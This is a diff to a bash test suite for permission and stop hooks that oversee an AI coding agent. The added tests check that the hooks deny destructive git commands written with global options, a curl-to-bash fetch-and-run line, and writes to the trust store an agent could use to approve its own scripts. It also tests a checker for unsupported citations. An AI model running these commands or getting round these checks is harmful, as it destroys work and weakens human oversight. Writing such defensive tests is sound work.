@@ -953,6 +953,15 @@ doc_stop_case "a log claiming no end still leaves the mid-workflow call alone" \
 doc_stop_case "an out-of-schema status reaches the checker instead of exiting the gate" \
     finalised "docs/plans/fix-2026-08-07-x.md=$PLAN_RUNNING" "$LOG_INVALID" "$RETRO_FILE"
 
+# The hook is the independent checker of the HARD plan-status row (#252
+# remainder): it blocks the divergence, last, after the measurements.
+doc_stop_case "a log reporting COMPLETED with a plan that does not blocks finalisation" \
+    block "docs/plans/fix-2026-08-07-x.md=$PLAN_RUNNING" "$LOG_DONE" "$RETRO_FILE"
+
+doc_stop_case "control: a FAILED log does not demand a COMPLETED plan" \
+    pass "docs/plans/fix-2026-08-07-x.md=$PLAN_RUNNING" \
+    '.github/logs/72-x.yaml=workflow_id: "72-x"\nstatus: "FAILED"\n' "$RETRO_FILE"
+
 # Unclassifiable is not the same as fine. The gate says which one it is rather
 # than passing in silence -- the failure mode this whole issue family is about.
 doc_stop_case "with no plan file the gate says it could not classify the call" \
@@ -1028,6 +1037,9 @@ stop_output() {
         use_fixture_conf
         git init -q .
         git checkout -q -b agent/72-x
+        # Whether a seeded file is under version control is an input for gates
+        # that must not instruct untracking one (issue #109).
+        if [ -n "${FIXTURE_TRACK:-}" ]; then git add -f -- $FIXTURE_TRACK; fi
         printf '%s' '{"session_id":"s1","transcript_path":"/none"}' \
             | bash ".github/hooks/scripts/$hook"
     ) 2>/dev/null
@@ -1206,6 +1218,145 @@ st_configured=$(stop_output stop-tests.sh \
     "docs/retros/72-x.md=$LEGACY_RETRO")
 assert_not_contains "stop-tests honours RETRO_DIR too" \
     "$st_configured" "WARNING"
+
+# --- one retro, checked at every candidate place (issue #239) --------------
+# A one-sided existence check cannot see a second copy. In MP
+# (RETRO_DIR=retros/auto) 3 of 6 workflows wrote a byte-identical twin to the
+# gitignored default, and the legacy check was off because the configured path
+# was the legacy one.
+CONF_ROOT_B='RETRO_DIR=retros/auto\n'
+
+doc_stop_case "a retro written twice blocks even though the configured copy exists" \
+    block "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/af-env.conf=$CONF_DOCS_B" \
+    "docs/retros/72-x.md=$LEGACY_RETRO" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO"
+
+doc_stop_case "the MP shape: RETRO_DIR=retros/auto with a twin at the default blocks" \
+    block "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/af-env.conf=$CONF_ROOT_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO"
+
+twin_out=$(stop_output documenter-stop.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/af-env.conf=$CONF_ROOT_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO")
+assert_contains "and names the twin to delete" \
+    "$twin_out" ".github/retros/auto/72-x.md"
+
+doc_stop_case "with the default config a twin at the legacy root blocks too" \
+    block "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO" \
+    "retros/auto/72-x.md=$LEGACY_RETRO"
+
+misplaced_out=$(stop_output documenter-stop.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/af-env.conf=$CONF_ROOT_B" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO")
+assert_contains "with RETRO_DIR=retros/auto a lone retro at the default is found and named" \
+    "$misplaced_out" "found '.github/retros/auto/72-x.md'"
+
+doc_stop_case "control: RETRO_DIR=retros/auto with the one retro there passes" \
+    pass "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/af-env.conf=$CONF_ROOT_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO"
+
+st_twin=$(stop_output stop-tests.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/af-env.conf=$CONF_ROOT_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO")
+assert_contains "stop-tests warns about the twin as well" \
+    "$st_twin" "WARNING"
+
+# --- a stray retro is a defect even when none was owed (issue #176) --------
+# Whether one was owed decides whether it MUST exist, not whether it may sit
+# in the gitignored default where it is silently lost.
+doc_stop_case "a clean run with a retro outside RETRO_DIR blocks" \
+    block "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_CLEAN_B" \
+    ".github/af-env.conf=$CONF_ROOT_B" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO"
+
+doc_stop_case "control: a clean run with a voluntary retro at RETRO_DIR passes" \
+    pass "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_CLEAN_B" \
+    ".github/af-env.conf=$CONF_ROOT_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO"
+
+st_stray_clean=$(stop_output stop-tests.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_CLEAN_B" \
+    ".github/af-env.conf=$CONF_ROOT_B" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO")
+assert_contains "stop-tests warns about a stray nobody owed" \
+    "$st_stray_clean" "WARNING"
+
+# --- a gate never instructs taking a record out of git (issue #109) --------
+# A tracked retro next to an ignored RETRO_DIR is history, not a stray: moving
+# it would remove it from version control, invisibly to `git status`.
+IGNORE_ALL_B='*\n'
+kept_owed=$(FIXTURE_TRACK=retros/auto/72-x.md stop_output documenter-stop.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/retros/auto/.gitignore=$IGNORE_ALL_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO")
+assert_contains "an owed retro is still owed when only a tracked legacy copy exists" \
+    "$kept_owed" '"decision": "block"'
+assert_not_contains "but the gate does not tell the agent to move the tracked copy" \
+    "$kept_owed" "move it to"
+assert_contains "and says why it stays" \
+    "$kept_owed" "version control"
+
+kept_twin=$(FIXTURE_TRACK=retros/auto/72-x.md stop_output documenter-stop.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/retros/auto/.gitignore=$IGNORE_ALL_B" \
+    ".github/retros/auto/72-x.md=$LEGACY_RETRO" \
+    "retros/auto/72-x.md=$LEGACY_RETRO")
+assert_not_contains "a tracked copy beside an ignored RETRO_DIR is not a twin to delete" \
+    "$kept_twin" '"decision": "block"'
+assert_contains "and the pass names the copy it left in place" \
+    "$kept_twin" "retros/auto/72-x.md"
+
+kept_clean=$(FIXTURE_TRACK=retros/auto/72-x.md stop_output documenter-stop.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_CLEAN_B" \
+    ".github/retros/auto/.gitignore=$IGNORE_ALL_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO")
+assert_not_contains "a clean run with a tracked legacy retro passes" \
+    "$kept_clean" '"decision": "block"'
+
+loose_owed=$(stop_output documenter-stop.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_RETRIES_B" \
+    ".github/retros/auto/.gitignore=$IGNORE_ALL_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO")
+assert_contains "control: an untracked legacy copy is still to be moved" \
+    "$loose_owed" "move it to .github/retros/auto/72-x.md"
+
+st_kept=$(FIXTURE_TRACK=retros/auto/72-x.md stop_output stop-tests.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_DONE" \
+    ".github/logs/72-x.yaml=$LOG_CLEAN_B" \
+    ".github/retros/auto/.gitignore=$IGNORE_ALL_B" \
+    "retros/auto/72-x.md=$LEGACY_RETRO")
+assert_not_contains "stop-tests does not warn about a tracked legacy retro either" \
+    "$st_kept" "WARNING"
+
+# #252 remainder, the message half -- here because stop_output is defined above.
+stale_out=$(stop_output documenter-stop.sh \
+    "docs/plans/fix-2026-08-07-x.md=$PLAN_RUNNING" "$LOG_DONE" "$RETRO_FILE")
+assert_contains "a stale plan status is blocked with the instruction to set the plan" \
+    "$stale_out" "set the plan"
 
 # --- Workflow-log timestamps are measured, not authored (issue #91) --------
 #
@@ -1733,6 +1884,63 @@ if grep -q 'function Get-AfSubagentReturn' "$HOOK_DIR/_common.ps1" 2>/dev/null; 
 else
     assert_true "_common.ps1 exposes the return reader" 0 "no Get-AfSubagentReturn wrapper"
 fi
+
+# --- a compliance quotation needs a read behind it (issue #286) ---------------
+# Bash twin of the ps1 cases: a report citing path:line with zero read_file
+# calls blocks (0 of 88 real logs fired it); a cited path never read is only
+# advisory (5 of 88 fired, mostly falsely); no log or no words is unmeasurable.
+cc_stop_out() {
+    # $1 = response text ('' -> no log), $2 = read path ('' -> none), $3 = 'tool' for a words-free return
+    local root fixture sid=s286 dir out resp native
+    root=$(mktemp -d 2>/dev/null || echo "/tmp/af-286-$$-$RANDOM")
+    fixture="$root/repo"
+    dir="$root/chat/debug-logs/$sid"
+    mkdir -p "$fixture/.github/hooks/scripts" "$dir"
+    # A real payload carries a native path; under MSYS a /tmp path is invisible
+    # to a Windows python, so hand the hook the native spelling where one exists.
+    native=$(cd "$root" && { pwd -W 2>/dev/null || pwd; })
+    for f in compliance-checker-stop.sh compliance-checker-stop.py _common.sh _agentlog.py subagent-return.py; do
+        [ -f "$HOOK_DIR/$f" ] && cp "$HOOK_DIR/$f" "$fixture/.github/hooks/scripts/"
+    done
+    if [ -n "$1" ] || [ "${3:-}" = "tool" ]; then
+        {
+            if [ -n "$2" ]; then
+                printf '%s\n' "{\"ts\":1500,\"type\":\"tool_call\",\"name\":\"read_file\",\"attrs\":{\"args\":\"{\\\"filePath\\\":\\\"$2\\\",\\\"startLine\\\":1,\\\"endLine\\\":40}\"}}"
+            fi
+            if [ "${3:-}" = "tool" ]; then
+                resp='[{\"role\":\"assistant\",\"parts\":[{\"type\":\"tool_call\",\"name\":\"read_file\"}]}]'
+            else
+                resp="[{\\\"role\\\":\\\"assistant\\\",\\\"parts\\\":[{\\\"type\\\":\\\"text\\\",\\\"content\\\":\\\"$1\\\"}]}]"
+            fi
+            printf '%s\n' "{\"ts\":2000,\"type\":\"agent_response\",\"attrs\":{\"response\":\"$resp\"}}"
+        } > "$dir/runSubagent-compliance-checker-toolu_cc.jsonl"
+    fi
+    out=$(
+        cd "$fixture" || exit 1
+        use_fixture_conf
+        git init -q . && git checkout -q -b agent/72-x
+        [ -f .github/hooks/scripts/compliance-checker-stop.sh ] || exit 0
+        printf '%s' "{\"session_id\":\"$sid\",\"transcript_path\":\"$native/chat/transcripts/$sid.jsonl\"}" \
+            | bash .github/hooks/scripts/compliance-checker-stop.sh
+    ) 2>/dev/null
+    rm -rf "$root"
+    printf '%s' "$out"
+}
+
+cc_quote='Post-Flight Verdict: PASS. RETRO_DIR is docs/retros (.github/af-env.conf:12).'
+cc_out=$(cc_stop_out "$cc_quote" "")
+assert_contains "a report quoting a file with no read behind it is blocked" "$cc_out" '"decision": "block"'
+assert_contains "and the block names the citation it could not back" "$cc_out" "af-env.conf"
+cc_out=$(cc_stop_out "$cc_quote" "c:/repo/.github/af-env.conf")
+assert_contains "control: the same report with a read behind it passes" "$cc_out" "PASS"
+assert_not_contains "and is not blocked" "$cc_out" '"decision": "block"'
+cc_out=$(cc_stop_out "Lesson at line 4 (.github/retros/auto/72-x.md:4)." "c:/repo/.github/af-env.conf")
+assert_contains "a cited path that was never read is advisory" "$cc_out" "ADVISORY"
+assert_not_contains "and not a block" "$cc_out" '"decision": "block"'
+cc_out=$(cc_stop_out "" "")
+assert_contains "no log is unmeasurable, not a pass and not a block" "$cc_out" "not measurable"
+cc_out=$(cc_stop_out "" "" tool)
+assert_contains "a return with no words is unmeasurable too" "$cc_out" "not measurable"
 
 # A wrapper with nothing to read must still answer, and its answer must be a
 # status rather than silence.
@@ -2291,6 +2499,33 @@ run_case "git branch -D is denied" \
     '{"tool_name":"runInTerminal","tool_input":{"command":"git branch -D old-branch"}}' \
     deny
 
+# --- Git global options before the subcommand (issue #431) -----------------
+# Every git rule was anchored at `git <subcommand>`, so `git -C <path> ...` --
+# the form agents are told to use in multi-root windows -- passed them all.
+for gcmd in \
+    'git -C C:/repo push --force origin x' \
+    'git -C C:/repo branch -D foo' \
+    'git -c core.pager=less reset --hard' \
+    'git -C C:/repo add .' \
+    'git --no-pager -C C:/repo rebase main' \
+    'git -C \"C:/my repo\" push origin main' \
+    'git --work-tree=C:/x --git-dir=C:/x/.git reset --hard'; do
+    run_case "$gcmd is denied (#431)" \
+        block-dangerous.sh agent/x \
+        "{\"tool_name\":\"runInTerminal\",\"tool_input\":{\"command\":\"$gcmd\"}}" \
+        deny
+done
+# Control: the normalised unit is still a data carrier, so a commit message
+# quoting a dangerous command stays data (was a false deny).
+run_case "git -C <path> commit quoting a dangerous command is not denied (#431)" \
+    block-dangerous.sh agent/x \
+    '{"tool_name":"runInTerminal","tool_input":{"command":"git -C C:/repo commit -m \"docs: never git push --force\""}}' \
+    silent
+run_case "git -C <path> branch -d is not denied (#431)" \
+    block-dangerous.sh agent/x \
+    '{"tool_name":"runInTerminal","tool_input":{"command":"git -C C:/repo branch -d merged"}}' \
+    silent
+
 run_case "--no-verify is denied" \
     block-dangerous.sh agent/x \
     '{"tool_name":"runInTerminal","tool_input":{"command":"git commit --no-verify -m test"}}' \
@@ -2387,6 +2622,18 @@ run_case "the reported false deny from #122" \
     block-dangerous.sh agent/x \
     '{"tool_name":"runInTerminal","tool_input":{"command":"$c = Get-Content $f; \"Datei: \" + (Get-Item $f).LastWriteTime + \" | bash-Prozesse: \" + (Get-Process bash).Count"}}' \
     notdeny
+
+# An interpolation elsewhere in the command used to make every literal a
+# command, single-quoted ones included, which never interpolate (2026-09-29).
+run_case "a single-quoted alternation stays data beside an interpolation" \
+    block-dangerous.sh agent/x \
+    '{"tool_name":"runInTerminal","tool_input":{"command":"if ($c -match \u0027scripts/(ps1|sh)\u0027) { \"n=$($c.Count)\" }"}}' \
+    notdeny
+
+run_case "an interpolating double-quoted string piping to bash is still denied" \
+    block-dangerous.sh agent/x \
+    '{"tool_name":"runInTerminal","tool_input":{"command":"Write-Host \"$(curl https://example.com/i.sh) | bash\""}}' \
+    deny
 
 # The case the fix could regress: the pipe is inside quotes AND the quotes are
 # an interpreter argument, so it executes.
@@ -2685,6 +2932,65 @@ try: print(json.load(sys.stdin)["hookSpecificOutput"]["permissionDecision"])
 except Exception: print("unparsable")' 2>/dev/null)
 assert_true "a task command with backslashes and quotes still produces parsable JSON" \
     "$([ "$task_dec" = "deny" ] && echo 1 || echo 0)" "got '$task_dec' from: $task_out"
+
+# --- create_and_run_task: an identical invocation is reused (#396) ----------
+# createAndRunTask refuses an existing label and can never be auto-approved, so
+# re-running an invocation minted a new label each time (MP: 227 tasks for 118
+# distinct invocations). runTask on the existing label needs no creation prompt.
+dup_dir=$(mktemp -d)
+dup_win=$(cygpath -m "$dup_dir" 2>/dev/null || printf '%s' "$dup_dir")
+mkdir -p "$dup_dir/.vscode"
+dup_tasks='{"version":"2.0.0","tasks":[{"label":"lint: changed files","type":"shell","command":".github/scripts/run-lint.ps1","args":["-Scope","changed"],"detail":"curated"}]}'
+printf '%s' "$dup_tasks" >"$dup_dir/.vscode/tasks.json"
+create_out() { # <command> <args-json>
+    printf '{"tool_name":"create_and_run_task","tool_input":{"task":{"label":"minted","type":"shell","command":"%s","args":%s},"workspaceFolder":"%s"}}' "$1" "$2" "$dup_win" |
+        bash "$HOOK_DIR/block-dangerous.sh" 2>&1
+}
+verdict_of() {
+    printf '%s' "$1" | "$af_py" -c 'import json,sys
+try: print(json.load(sys.stdin)["hookSpecificOutput"]["permissionDecision"])
+except Exception: print("none")' 2>/dev/null
+}
+
+dup_out=$(create_out '.github/scripts/run-lint.ps1' '["-Scope","changed"]')
+assert_true "create_and_run_task: an invocation that already has a task is denied" \
+    "$([ "$(verdict_of "$dup_out")" = "deny" ] && echo 1 || echo 0)" "got: $dup_out"
+assert_true "create_and_run_task: the deny names the existing label and runTask" \
+    "$(printf '%s' "$dup_out" | grep -q 'lint: changed files' && printf '%s' "$dup_out" | grep -q 'runTask' && echo 1 || echo 0)" "got: $dup_out"
+
+dup_out=$(create_out 'powershell' '["-NoProfile","-File",".github/scripts/run-lint.ps1","-Scope","changed"]')
+assert_true "create_and_run_task: the same script behind powershell -File is the same invocation" \
+    "$([ "$(verdict_of "$dup_out")" = "deny" ] && echo 1 || echo 0)" "got: $dup_out"
+
+dup_out=$(create_out '.github/scripts/run-lint.ps1' '["-Scope","all"]')
+assert_true "create_and_run_task: different arguments are still allowed" \
+    "$([ "$(verdict_of "$dup_out")" = "allow" ] && echo 1 || echo 0)" "got: $dup_out"
+
+printf '// comment\n%s' "$dup_tasks" >"$dup_dir/.vscode/tasks.json"
+dup_out=$(create_out '.github/scripts/run-lint.ps1' '["-Scope","changed"]')
+assert_true "create_and_run_task: an unparsable tasks.json does not deny" \
+    "$([ "$(verdict_of "$dup_out")" = "allow" ] && echo 1 || echo 0)" "got: $dup_out"
+
+rm -f "$dup_dir/.vscode/tasks.json"
+dup_out=$(create_out '.github/scripts/run-lint.ps1' '["-Scope","changed"]')
+assert_true "create_and_run_task: no tasks.json is still allowed" \
+    "$([ "$(verdict_of "$dup_out")" = "allow" ] && echo 1 || echo 0)" "got: $dup_out"
+rm -rf "$dup_dir"
+
+# --- The command server's trust store is not agent-editable (#60) -----------
+# An agent that could write the store would approve its own script. Judged on
+# the target path only: content that merely names the path is not a write to it.
+trust_win='C:\\Users\\dev\\AppData\\Local\\af-command-mcp\\trust\\0a1b.json'
+run_case "trust store: create_file into the store is denied" block-dangerous.sh agent/fixture \
+    "{\"tool_name\":\"create_file\",\"tool_input\":{\"filePath\":\"$trust_win\",\"content\":\"{}\"}}" deny
+run_case "trust store: an edit with forward slashes is denied" block-dangerous.sh agent/fixture \
+    '{"tool_name":"replace_string_in_file","tool_input":{"filePath":"/home/dev/.local/state/af-command-mcp/trust/0a1b.json","oldString":"a","newString":"b"}}' deny
+run_case "trust store: a batch edit with one entry in the store is denied" block-dangerous.sh agent/fixture \
+    "{\"tool_name\":\"multi_replace_string_in_file\",\"tool_input\":{\"replacements\":[{\"filePath\":\"/repo/a.py\"},{\"filePath\":\"$trust_win\"}]}}" deny
+run_case "trust store: an ordinary edit stays silent (control)" block-dangerous.sh agent/fixture \
+    '{"tool_name":"create_file","tool_input":{"filePath":"/repo/docs/a.md","content":"x"}}' silent
+run_case "trust store: content naming the store is not a write to it" block-dangerous.sh agent/fixture \
+    "{\"tool_name\":\"create_file\",\"tool_input\":{\"filePath\":\"/repo/README.md\",\"content\":\"see $trust_win\"}}" silent
 
 # --- The policy is stated, not inherited (issue #108) ----------------------
 #
